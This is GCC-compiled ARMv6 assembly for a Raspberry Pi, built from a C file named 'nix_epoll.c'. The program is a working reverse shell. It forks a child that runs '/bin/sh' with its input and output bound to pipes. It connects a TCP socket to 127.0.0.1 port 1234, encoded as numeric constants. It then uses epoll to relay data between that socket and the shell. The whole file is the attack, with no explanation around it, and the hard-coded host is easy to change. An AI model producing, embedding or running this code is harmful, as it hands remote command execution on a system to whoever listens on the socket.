	.arch armv6
	.eabi_attribute 28, 1
	.eabi_attribute 20, 1
	.eabi_attribute 21, 1
	.eabi_attribute 23, 3
	.eabi_attribute 24, 1
	.eabi_attribute 25, 1
	.eabi_attribute 26, 2
	.eabi_attribute 30, 4
	.eabi_attribute 34, 1
	.eabi_attribute 18, 4
	.file	"nix_epoll.c"
	.section	.text.startup,"ax",%progbits
	.align	2
	.global	main
	.syntax unified
	.arm
	.fpu vfp
	.type	main, %function
main:
	@ args = 0, pretend = 0, frame = 8272
	@ frame_needed = 0, uses_anonymous_args = 0
	push	{r4, r5, r6, r7, r8, r9, lr}
	sub	sp, sp, #8256
	sub	sp, sp, #20
	mov	r0, sp
	bl	pipe
	add	r0, sp, #8
	bl	pipe
	bl	fork
	subs	r7, r0, #0
	bne	.L2
	mov	r1, r7
	ldr	r0, [sp, #0]
	bl	dup2
	mov	r1, #1
	ldr	r0, [sp, #12]
	bl	dup2
	mov	r1, #2
	ldr	r0, [sp, #12]
	bl	dup2
	ldr	r0, [sp, #0]
	bl	close
	ldr	r0, [sp, #4]
	bl	close
	ldr	r0, [sp, #8]
	bl	close
	ldr	r0, [sp, #12]
	bl	close
	ldr	r0, .L14
	mov	r2, r7
	add	r1, sp, #16
	str	r0, [sp, #16]
	str	r7, [sp, #20]
	bl	execve
.L3:
	ldr	r0, [sp, #4]
	bl	close
	ldr	r0, [sp, #8]
	bl	close
	mov	r0, #0
	add	sp, sp, #8256
	add	sp, sp, #20
	@ sp needed
	pop	{r4, r5, r6, r7, r8, r9, pc}
.L2:
	ldr	r0, [sp, #0]
	bl	close
	ldr	r0, [sp, #12]
	bl	close
	mov	r2, #0
	mov	r1, #1
	mov	r0, #2
	bl	socket
	mov	r3, #2
	strh	r3, [sp, #64]	@ movhi
	ldr	r3, .L14+4
	mov	r2, #16
	strh	r3, [sp, #66]	@ movhi
	ldr	r3, .L14+8
	add	r1, sp, #64
	str	r3, [sp, #68]
	mov	r4, r0
	bl	connect
	mov	r0, #0
	bl	epoll_create1
	subs	r6, r0, #0
	ble	.L4
	add	r8, sp, #80
	ldr	r9, [sp, #8]
	mov	r5, #1
	str	r5, [r8, #-48]!
	mov	r2, r4
	mov	r3, r8
	mov	r1, r5
	str	r4, [sp, #24]
	str	r9, [sp, #28]
	str	r4, [sp, #40]
	bl	epoll_ctl
	mov	r3, r8
	mov	r2, r9
	mov	r1, r5
	mov	r0, r6
	str	r9, [sp, #40]
	str	r5, [sp, #32]
	bl	epoll_ctl
	mvn	r8, #0
.L8:
	mov	r3, r8
	mov	r2, r5
	add	r1, sp, #48
	mov	r0, r6
	bl	epoll_wait
	cmp	r0, #0
	ble	.L5
	ldr	r3, [sp, #48]
	tst	r3, #24
	bne	.L5
	tst	r3, #1
	beq	.L5
	ldr	r3, [sp, #56]
	mov	r2, #8192
	cmp	r4, r3
	add	r1, sp, #80
	bne	.L6
	mov	r0, r4
	bl	read
	add	r1, sp, #80
	mov	r2, r0
	ldr	r0, [sp, #4]
.L13:
	bl	write
	b	.L8
.L6:
	ldr	r0, [sp, #8]
	bl	read
	add	r1, sp, #80
	mov	r2, r0
	mov	r0, r4
	b	.L13
.L5:
	mov	r3, #0
	ldr	r2, [sp, #24]
	mov	r1, #2
	mov	r0, r6
	bl	epoll_ctl
	mov	r3, #0
	ldr	r2, [sp, #28]
	mov	r1, #2
	mov	r0, r6
	bl	epoll_ctl
	mov	r0, r6
	bl	close
.L4:
	mov	r1, #17
	mov	r0, r7
	bl	kill
	mov	r0, r4
	bl	close
	b	.L3
.L15:
	.align	2
.L14:
	.word	.LC0
	.word	-11772
	.word	16777343
	.size	main, .-main
	.section	.rodata.str1.1,"aMS",%progbits,1
.LC0:
	.ascii	"/bin/sh\000"
	.ident	"GCC: (Raspbian 6.3.0-18+rpi1) 6.3.0 20170516"
	.section	.note.GNU-stack,"",%progbits
